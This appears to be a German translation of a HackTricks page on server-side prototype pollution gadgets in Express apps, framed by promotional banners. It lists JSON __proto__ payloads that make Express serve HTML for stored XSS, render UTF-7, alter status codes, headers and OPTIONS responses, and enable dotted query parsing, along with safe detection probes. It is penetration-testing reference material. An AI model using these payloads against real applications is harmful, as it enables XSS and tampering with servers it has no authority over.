# Express Prototype Pollution Gadgets

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) ist eine von **Dark Web** angetriebene Suchmaschine, die **kostenlose** Funktionen bietet, um zu √ºberpr√ºfen, ob ein Unternehmen oder seine Kunden von **Stealer-Malware** **kompromittiert** wurden.

Das Hauptziel von WhiteIntel ist es, Konto√ºbernahmen und Ransomware-Angriffe aufgrund von informationsstehlender Malware zu bek√§mpfen.

Sie k√∂nnen ihre Website besuchen und ihr Tool kostenlos ausprobieren unter:

{% embed url="https://whiteintel.io" %}

***

## Serve XSS-Antworten

**F√ºr weitere Details** [**schauen Sie sich die originale Forschung an**](https://portswigger.net/research/server-side-prototype-pollution)

### √Ñndern des JSON-Inhaltstyps in HTML

In einer Express-App, die eine **JSON-Inhaltstyp-Antwort** verwendet und ein JSON reflektiert:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
In diesen F√§llen ist XSS normalerweise nicht m√∂glich bei einem JSON-Inhaltstyp. Mit der Prototyp-Verunreinigung k√∂nnen wir jedoch **Express verwirren, um eine HTML-Antwort zu senden.** Diese Schwachstelle beruht darauf, dass die Anwendung **`res.send(obj)`** verwendet und den Body-Parser mit dem Anwendungstyp application/json verwendet.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
Durch das **Verschmutzen** der Eigenschaften **`body`** und **`_body`** ist es m√∂glich, **Express dazu zu bringen, den HTML-Inhaltstyp** zu servieren und die `_body`-Eigenschaft widerzuspiegeln, was zu gespeichertem XSS f√ºhrt.

### UTF7 rendern

Es ist m√∂glich, Express **UTF-7-Inhalte mit** zu rendern:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## Sichere Scanning-Techniken

### JSON-Leerzeichen

Das folgende PP f√ºgt Attributen innerhalb eines JSON einen zus√§tzlichen Leerzeichen hinzu, das die Funktionalit√§t nicht beeintr√§chtigt:
```json
{"__proto__":{"json spaces": " "}}
```
Dann wird ein reflektiertes JSON wie folgt aussehen:
```json
{"foo":  "bar"} -- Note the extra space
```
### Offenlegung von Headern

Das folgende PP-Gadget l√§sst den Server den HTTP-Header zur√ºcksenden: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Es erfordert, dass das **CORS-Modul installiert ist**

### **OPTIONS-Methode**

Mit dem folgenden Payload ist es m√∂glich, **eine Methode vor einer OPTIONS-Antwort zu verbergen**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Status**

Es ist m√∂glich, den **zur√ºckgegebenen Statuscode** mithilfe des folgenden PP-Payloads zu √§ndern:
```json
{"__proto__":{"status":510}}
```
### Fehler

Wenn Sie einem Prototypen mit einem Primitivum wie einem String zuweisen, f√ºhrt dies zu einer **no-op-Operation, da der Prototyp ein Objekt sein muss**. Wenn Sie versuchen, einem Prototypenobjekt das `Object.prototype` selbst zuzuweisen, wird dies eine **Ausnahme ausl√∂sen**. Wir k√∂nnen diese beiden Verhaltensweisen verwenden, um festzustellen, ob die Prototypenverunreinigung erfolgreich war:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Reflektierter Wert

Wenn eine Anwendung ein Objekt in ihrer Antwort enth√§lt und ein Attribut mit einem **ungew√∂hnlichen Namen neben `__proto__` erstellt**, kann dies aufschlussreich sein. Insbesondere wenn **nur das ungew√∂hnliche Attribut** in der Antwort zur√ºckgegeben wird, k√∂nnte dies auf die Verwundbarkeit der Anwendung hinweisen:
```json
{"unusualName":"value","__proto__":"test"}
```
Dar√ºber hinaus, in Szenarien, in denen eine Bibliothek wie Lodash verwendet wird, bietet das Setzen einer Eigenschaft sowohl √ºber die Prototypenverunreinigung (PP) als auch direkt im Objekt einen weiteren diagnostischen Ansatz. Wenn eine solche Eigenschaft aus der Antwort ausgelassen wird, deutet dies darauf hin, dass Lodash die Existenz der Eigenschaft im Zielobjekt vor dem Zusammenf√ºhren √ºberpr√ºft:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Sonstiges

### Punkte erlauben

Es gibt eine Option in Express, die es Ihnen erm√∂glicht, **Objekte aus Abfragezeichenfolgenparametern zu erstellen**.\
Sie k√∂nnten es auf jeden Fall in einer Bug-**Kette** verwenden, um eine **Prototyp-Pollutions-Schwachstelle** auszunutzen.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` erstellt ein Objekt in Node.**

## Referenzen

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) ist eine von **Dark Web** angetriebene Suchmaschine, die **kostenlose** Funktionen bietet, um zu √ºberpr√ºfen, ob ein Unternehmen oder seine Kunden von **Stealer-Malware** **kompromittiert** wurden.

Das Hauptziel von WhiteIntel ist es, Konto√ºbernahmen und Ransomware-Angriffe aufgrund von informationsstehlender Malware zu bek√§mpfen.

Sie k√∂nnen ihre Website besuchen und ihr Tool **kostenlos** ausprobieren unter:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben** oder **HackTricks im PDF-Format herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
